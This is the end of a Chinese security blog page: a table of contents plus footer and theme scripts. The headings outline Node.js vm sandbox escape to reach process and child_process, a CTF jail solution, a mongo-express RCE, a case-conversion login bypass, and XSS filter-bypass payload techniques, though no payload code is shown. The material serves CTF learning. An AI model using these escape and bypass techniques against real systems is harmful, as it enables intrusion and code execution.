constructor，所以可以利用Function对象构造一个函数并执行。(此时Function对象的上下文环境是处于主程序中的) 这里构造的函数内的语句是return this.process.env，结果是返回了主程序的环境变量。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#配合chile-process-exec-就可以执行任意命令了："><span class="nav-number">1.4.0.7.</span> <span class="nav-text">配合chile_process.exec()就可以执行任意命令了：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#vm中的脚本等同于："><span class="nav-number">1.4.0.8.</span> <span class="nav-text">vm中的脚本等同于：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#从上边脚本中可以看出vm不安全的原因。vm内部脚本的Context对象是在主程序中定义的，根据JS原型链原理，可以轻松获取主程序中的-Function-对象，用主程序的-Function-对象构造一个函数，那么这个函数运行时，就是在主程序闭包环境中执行的！所以，我们轻易地获取到了主程序的全局对象-process，最终控制主程序！"><span class="nav-number">1.4.0.9.</span> <span class="nav-text">从上边脚本中可以看出vm不安全的原因。vm内部脚本的Context对象是在主程序中定义的，根据JS原型链原理，可以轻松获取主程序中的 Function 对象，用主程序的 Function 对象构造一个函数，那么这个函数运行时，就是在主程序闭包环境中执行的！所以，我们轻易地获取到了主程序的全局对象 process，最终控制主程序！</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#为了避免上面这种情况，可以将上下文简化成只包含基本类型，如下所示："><span class="nav-number">1.4.0.10.</span> <span class="nav-text">为了避免上面这种情况，可以将上下文简化成只包含基本类型，如下所示：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#与此同时我们还可以使用vm2，但是也不是绝对安全的。"><span class="nav-number">1.4.0.11.</span> <span class="nav-text">与此同时我们还可以使用vm2，但是也不是绝对安全的。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#参考链接"><span class="nav-number">1.4.0.12.</span> <span class="nav-text">参考链接</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#最近的mongo-express-RCE-CVE-2019-10758-漏洞就是配合vm沙箱逃逸来利用的。"><span class="nav-number">1.4.0.13.</span> <span class="nav-text">最近的mongo-express RCE(CVE-2019-10758)漏洞就是配合vm沙箱逃逸来利用的。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#具体分析可参考：CVE-2019-10758-mongo-expressRCE复现分析"><span class="nav-number">1.4.0.14.</span> <span class="nav-text">具体分析可参考：CVE-2019-10758:mongo-expressRCE复现分析</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#BreizhCTF-2019-calc-2"><span class="nav-number">1.4.1.</span> <span class="nav-text">BreizhCTF 2019 - calc-2</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#CTF-URL-https-www-breizhctf-com"><span class="nav-number">1.4.1.1.</span> <span class="nav-text">CTF URL: https://www.breizhctf.com/</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Solves-0-Points-400-Category-Jail"><span class="nav-number">1.4.1.2.</span> <span class="nav-text">Solves: 0 / Points: 400 / Category: Jail</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#挑战说明"><span class="nav-number">1.4.1.3.</span> <span class="nav-text">挑战说明</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#题目源码"><span class="nav-number">1.4.1.4.</span> <span class="nav-text">题目源码</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#沙箱是使用Node-js-vm-module来实现的，我们只能使用其中的log-函数。"><span class="nav-number">1.4.1.5.</span> <span class="nav-text">沙箱是使用Node.js vm module来实现的，我们只能使用其中的log()函数。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#题目解决"><span class="nav-number">1.4.1.6.</span> <span class="nav-text">题目解决</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们的目标是执行系统命令来获取flag。"><span class="nav-number">1.4.1.7.</span> <span class="nav-text">我们的目标是执行系统命令来获取flag。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#第一步：虚拟机逃逸"><span class="nav-number">1.4.1.8.</span> <span class="nav-text">第一步：虚拟机逃逸</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#为了从虚拟机逃逸，我们将使用构造函数的构造函数来创建具有受控主体的匿名函数。"><span class="nav-number">1.4.1.9.</span> <span class="nav-text">为了从虚拟机逃逸，我们将使用构造函数的构造函数来创建具有受控主体的匿名函数。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#例如-使用chrome-console-："><span class="nav-number">1.4.1.10.</span> <span class="nav-text">例如(使用chrome console)：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#使用这种技术，我们可以在vm上下文之外执行代码。实际上，this通过调用返回的对象constructor不限于log函数："><span class="nav-number">1.4.1.11.</span> <span class="nav-text">使用这种技术，我们可以在vm上下文之外执行代码。实际上，this通过调用返回的对象constructor不限于log函数：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#与vm上下文相比："><span class="nav-number">1.4.1.12.</span> <span class="nav-text">与vm上下文相比：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#第二步：执行一个shell命令"><span class="nav-number">1.4.1.13.</span> <span class="nav-text">第二步：执行一个shell命令</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#脚本的process-mainModule模块已经被清除，因此我们无法访问require函数。"><span class="nav-number">1.4.1.14.</span> <span class="nav-text">脚本的process.mainModule模块已经被清除，因此我们无法访问require函数。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#但是，我们确定该binding函数在构造函数返回的对象上可用。"><span class="nav-number">1.4.1.15.</span> <span class="nav-text">但是，我们确定该binding函数在构造函数返回的对象上可用。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#该binding功能允许加载内部模块。首先，我们尝试使用fs模块从文件中读取flag。"><span class="nav-number">1.4.1.16.</span> <span class="nav-text">该binding功能允许加载内部模块。首先，我们尝试使用fs模块从文件中读取flag。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Fail"><span class="nav-number">1.4.1.17.</span> <span class="nav-text">Fail:(</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#但是我们能够列出目录并且标识flag的位置："><span class="nav-number">1.4.1.18.</span> <span class="nav-text">但是我们能够列出目录并且标识flag的位置：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#后来题目的作者给了以下tip"><span class="nav-number">1.4.1.19.</span> <span class="nav-text">后来题目的作者给了以下tip:</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#因此，让我们来阅读nodejs-source-code-on-Github-for-child-process"><span class="nav-number">1.4.1.20.</span> <span class="nav-text">因此，让我们来阅读nodejs source code on Github for child_process:</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#chile-process模块的内部通过绑定process-wrap来调用spawn函数执行命令："><span class="nav-number">1.4.1.21.</span> <span class="nav-text">chile_process模块的内部通过绑定process_wrap来调用spawn函数执行命令：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#因此我们必须创建一个Process对象并调用其spawn函数执行系统命令："><span class="nav-number">1.4.1.22.</span> <span class="nav-text">因此我们必须创建一个Process对象并调用其spawn函数执行系统命令：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#1-检查绑定是否不会失败："><span class="nav-number">1.4.1.23.</span> <span class="nav-text">1-检查绑定是否不会失败：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-实例化一个Process对象："><span class="nav-number">1.4.1.24.</span> <span class="nav-text">2-实例化一个Process对象：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#3-spawn使用良好的参数调用该函数："><span class="nav-number">1.4.1.25.</span> <span class="nav-text">3-spawn使用良好的参数调用该函数：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#4-payload"><span class="nav-number">1.4.1.26.</span> <span class="nav-text">4-payload:</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#参考链接："><span class="nav-number">1.4.2.</span> <span class="nav-text">参考链接：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#https-tipi-hack-github-io-2019-04-14-breizh-jail-calc2-html"><span class="nav-number">1.4.2.1.</span> <span class="nav-text">https://tipi-hack.github.io/2019/04/14/breizh-jail-calc2.html</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-es6-ruanyifeng-com-docs-proxy"><span class="nav-number">1.4.2.2.</span> <span class="nav-text">https://es6.ruanyifeng.com/#docs/proxy</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-segmentfault-com-a-1190000012672620"><span class="nav-number">1.4.2.3.</span> <span class="nav-text">https://segmentfault.com/a/1190000012672620</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x05-javascript大小写特性"><span class="nav-number">1.5.</span> <span class="nav-text">0x05 javascript大小写特性</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#在javascript中有几个特殊的字符需要记录一下"><span class="nav-number">1.5.0.1.</span> <span class="nav-text">在javascript中有几个特殊的字符需要记录一下</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#对于toUpperCase"><span class="nav-number">1.5.0.2.</span> <span class="nav-text">对于toUpperCase():</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#对于toLowerCase"><span class="nav-number">1.5.0.3.</span> <span class="nav-text">对于toLowerCase():</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#在绕一些规则的时候就可以利用这几个特殊字符进行绕过"><span class="nav-number">1.5.0.4.</span> <span class="nav-text">在绕一些规则的时候就可以利用这几个特殊字符进行绕过</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#CTF题实例-Hacktm中的一道Nodejs题"><span class="nav-number">1.5.1.</span> <span class="nav-text">CTF题实例 - Hacktm中的一道Nodejs题</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#部分题目源码："><span class="nav-number">1.5.1.1.</span> <span class="nav-text">部分题目源码：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#解题时需要登录管理员的用户名，但是在登录时，isValidUser函数会对用户输入的用户名进行toUpperCase处理，再与管理员用户名进行对比。如果输入的用户名与管理员用户名相同，就不允许登录。"><span class="nav-number">1.5.1.2.</span> <span class="nav-text">解题时需要登录管理员的用户名，但是在登录时，isValidUser函数会对用户输入的用户名进行toUpperCase处理，再与管理员用户名进行对比。如果输入的用户名与管理员用户名相同，就不允许登录。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#但是我们可以看到，在之后的一个判断用户是否为管理员的函数中，对用户名进行处理的是toLowerCase。所以这两个差异，就可以使用大小写特性来进行绕过。"><span class="nav-number">1.5.1.3.</span> <span class="nav-text">但是我们可以看到，在之后的一个判断用户是否为管理员的函数中，对用户名进行处理的是toLowerCase。所以这两个差异，就可以使用大小写特性来进行绕过。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#题目中默认的管理员用户名为：hacktm"><span class="nav-number">1.5.1.4.</span> <span class="nav-text">题目中默认的管理员用户名为：hacktm</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#所以，我们指定登录时的用户名为：hacKtm-即可绕过isValidUser和isAdmin的验证。"><span class="nav-number">1.5.1.5.</span> <span class="nav-text">所以，我们指定登录时的用户名为：hacKtm 即可绕过isValidUser和isAdmin的验证。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#题目完整Writeup-HackTM中一道Node-js题分析-Draw-with-us"><span class="nav-number">1.5.1.6.</span> <span class="nav-text">题目完整Writeup:HackTM中一道Node.js题分析(Draw with us)</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x06-常见的xss-payload"><span class="nav-number">1.6.</span> <span class="nav-text">0x06 常见的xss payload</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-无字母的xss-payload"><span class="nav-number">1.6.1.</span> <span class="nav-text">1.无字母的xss payload:</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#javascript中调用函数完全可以不需要存在任何字母，js中的匿名函数："><span class="nav-number">1.6.1.1.</span> <span class="nav-text">javascript中调用函数完全可以不需要存在任何字母，js中的匿名函数：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#构造的脚本："><span class="nav-number">1.6.1.2.</span> <span class="nav-text">构造的脚本：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#一般可以绕过下面的验证："><span class="nav-number">1.6.1.3.</span> <span class="nav-text">一般可以绕过下面的验证：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#你可能会想那么我们直接这样过滤就好了："><span class="nav-number">1.6.1.4.</span> <span class="nav-text">你可能会想那么我们直接这样过滤就好了：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#但是上面的过滤是错误的，因为开发人员认为-是-的集合，而实际上，RegExp方式创建正则表达式时，需要写成-，原因是：原因是：-在字符串里是转义符，在正则里也是转义符。"><span class="nav-number">1.6.1.5.</span> <span class="nav-text">但是上面的过滤是错误的，因为开发人员认为[\\({]是\,(,{的集合，而实际上，RegExp方式创建正则表达式时，需要写成[\\\\({]，原因是：原因是：\在字符串里是转义符，在正则里也是转义符。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#假如这个正则表达式-，不允许-，-那么还可以执行javascript代码吗？答案是肯定的，如下："><span class="nav-number">1.6.1.6.</span> <span class="nav-text">假如这个正则表达式[\\({]，不允许(，{那么还可以执行javascript代码吗？答案是肯定的，如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#使用location-href来执行js，并且将其中的括号与花括号进行URL编码。"><span class="nav-number">1.6.1.7.</span> <span class="nav-text">使用location.href来执行js，并且将其中的括号与花括号进行URL编码。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#最后给出我的过滤："><span class="nav-number">1.6.1.8.</span> <span class="nav-text">最后给出我的过滤：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-标签-属性分割符"><span class="nav-number">1.6.2.</span> <span class="nav-text">2.标签-属性分割符</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#有些过滤器会“天真地认为”只有某些特定字符可以分隔标签及其属性，下面给出的是在Firefox和Chrome中能够使用的有效分隔符的完整列表："><span class="nav-number">1.6.2.1.</span> <span class="nav-text">有些过滤器会“天真地认为”只有某些特定字符可以分隔标签及其属性，下面给出的是在Firefox和Chrome中能够使用的有效分隔符的完整列表：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#使用方式"><span class="nav-number">1.6.2.2.</span> <span class="nav-text">使用方式</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#一般来说，你的Payload构造如下："><span class="nav-number">1.6.2.3.</span> <span class="nav-text">一般来说，你的Payload构造如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#你可以尝试使用上述字符来替换svg和onload中间的空格，这样就可以保证HTML仍然有效并且Payload能够正确执行-DEMO-有效的HTML-："><span class="nav-number">1.6.2.4.</span> <span class="nav-text">你可以尝试使用上述字符来替换svg和onload中间的空格，这样就可以保证HTML仍然有效并且Payload能够正确执行(DEMO:有效的HTML)：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-基于javascript事件的xss"><span class="nav-number">1.6.3.</span> <span class="nav-text">3.基于javascript事件的xss</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#详细参考资料：更多的HTML事件"><span class="nav-number">1.6.3.1.</span> <span class="nav-text">详细参考资料：更多的HTML事件</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#标准HTML事件"><span class="nav-number">1.6.3.2.</span> <span class="nav-text">标准HTML事件</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#0点击事件："><span class="nav-number">1.6.3.3.</span> <span class="nav-text">0点击事件：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#使用样例："><span class="nav-number">1.6.3.4.</span> <span class="nav-text">使用样例：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#5-古怪的XSS向量"><span class="nav-number">1.6.4.</span> <span class="nav-text">5.古怪的XSS向量</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#下面给出的是一些比较”奇葩”的XSS测试向量，这些测试向量很少见："><span class="nav-number">1.6.4.1.</span> <span class="nav-text">下面给出的是一些比较”奇葩”的XSS测试向量，这些测试向量很少见：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#6-XSS多覆盖样例"><span class="nav-number">1.6.5.</span> <span class="nav-text">6.XSS多覆盖样例</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#下面我给出了几份XSS的多段代码，因为有的时候我们只需要输入特定的字符，或者只需要一个基于DOM或基于非DOM的注入场景。"><span class="nav-number">1.6.5.1.</span> <span class="nav-text">下面我给出了几份XSS的多段代码，因为有的时候我们只需要输入特定的字符，或者只需要一个基于DOM或基于非DOM的注入场景。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#7-框架"><span class="nav-number">1.6.6.</span> <span class="nav-text">7.框架</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#为了攻击框架，我们还需要对相关的模板语言进行研究和分析。"><span class="nav-number">1.6.6.1.</span> <span class="nav-text">为了攻击框架，我们还需要对相关的模板语言进行研究和分析。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#AngularJS"><span class="nav-number">1.6.6.2.</span> <span class="nav-text">AngularJS</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#9-XSS过滤器绕过"><span class="nav-number">1.6.7.</span> <span class="nav-text">9.XSS过滤器绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#圆括号过滤"><span class="nav-number">1.6.7.1.</span> <span class="nav-text">圆括号过滤</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#利用HTML解析器和JS语句："><span class="nav-number">1.6.7.2.</span> <span class="nav-text">利用HTML解析器和JS语句：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#限制字符集"><span class="nav-number">1.6.7.3.</span> <span class="nav-text">限制字符集</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#下面这三个站点可以将有效的JS代码转换为所谓的“乱码”来绕过绝大多数的过滤器："><span class="nav-number">1.6.7.4.</span> <span class="nav-text">下面这三个站点可以将有效的JS代码转换为所谓的“乱码”来绕过绝大多数的过滤器：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#1、JSFuck"><span class="nav-number">1.6.7.5.</span> <span class="nav-text">1、JSFuck</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2、JSFsck-不带圆括号的JSFuck"><span class="nav-number">1.6.7.6.</span> <span class="nav-text">2、JSFsck(不带圆括号的JSFuck)</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#3、jjencode"><span class="nav-number">1.6.7.7.</span> <span class="nav-text">3、jjencode</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#关键词过滤"><span class="nav-number">1.6.7.8.</span> <span class="nav-text">关键词过滤</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#避免使用的关键词："><span class="nav-number">1.6.7.9.</span> <span class="nav-text">避免使用的关键词：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#参考链接-1"><span class="nav-number">1.6.8.</span> <span class="nav-text">参考链接</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#https-wooyun-js-org-drops-E4-B8-80-E4-B8-AA-E5-8F-AF-E5-A4-A7-E8-A7-84-E6-A8-A1-E6-82-84-E6-97-A0-E5-A3-B0-E6-81-AF-E7-AA-83-E5-8F-96-E6-B7-98-E5-AE-9D-E6-94-AF-E4-BB-98-E5-AE-9D-E8-B4-A6-E5-8F-B7-E4-B8-8E-E5-AF-86-E7-A0-81-E7-9A-84-E6-BC-8F-E6-B4-9E-20-EF-BC-88-E5-9F-8B-E9-9B-B7-E5-BC-8F-E6-94-BB-E5-87-BB-E9-99-84-E5-B8-A6-E8-A7-86-E9-A2-91-E6-BC-94-E7-A4-BA-EF-BC-89-html"><span class="nav-number">1.6.8.1.</span> <span class="nav-text">https://wooyun.js.org/drops/%E4%B8%80%E4%B8%AA%E5%8F%AF%E5%A4%A7%E8%A7%84%E6%A8%A1%E6%82%84%E6%97%A0%E5%A3%B0%E6%81%AF%E7%AA%83%E5%8F%96%E6%B7%98%E5%AE%9D.%E6%94%AF%E4%BB%98%E5%AE%9D%E8%B4%A6%E5%8F%B7%E4%B8%8E%E5%AF%86%E7%A0%81%E7%9A%84%E6%BC%8F%E6%B4%9E%20-%EF%BC%88%E5%9F%8B%E9%9B%B7%E5%BC%8F%E6%94%BB%E5%87%BB%E9%99%84%E5%B8%A6%E8%A7%86%E9%A2%91%E6%BC%94%E7%A4%BA%EF%BC%89.html</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-www-freebuf-com-articles-web-226719-html"><span class="nav-number">1.6.8.2.</span> <span class="nav-text">https://www.freebuf.com/articles/web/226719.html</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x07-总结"><span class="nav-number">1.7.</span> <span class="nav-text">0x07 总结</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#相关javascript的知识总结。"><span class="nav-number">1.7.0.1.</span> <span class="nav-text">相关javascript的知识总结。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x08-参考链接："><span class="nav-number">1.8.</span> <span class="nav-text">0x08 参考链接：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#https-xz-aliyun-com-t-7184"><span class="nav-number">1.8.0.1.</span> <span class="nav-text">https://xz.aliyun.com/t/7184</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#浅谈Node-js-Web的安全问题"><span class="nav-number">1.8.0.2.</span> <span class="nav-text">浅谈Node.js Web的安全问题</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#深入理解JavaScript-Prototype污染攻击"><span class="nav-number">1.8.0.3.</span> <span class="nav-text">深入理解JavaScript Prototype污染攻击</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#利用-Node-js-反序列化漏洞远程执行代码"><span class="nav-number">1.8.0.4.</span> <span class="nav-text">利用 Node.js 反序列化漏洞远程执行代码</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Sandboxing-NodeJS-is-hard-here-is-why"><span class="nav-number">1.8.0.5.</span> <span class="nav-text">Sandboxing NodeJS is hard, here is why</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-segmentfault-com-a-1190000012672620-1"><span class="nav-number">1.8.0.6.</span> <span class="nav-text">https://segmentfault.com/a/1190000012672620</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Fuzz中的javascript大小写特性"><span class="nav-number">1.8.0.7.</span> <span class="nav-text">Fuzz中的javascript大小写特性</span></a></li></ol></li></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ljdd520</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">169.2k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
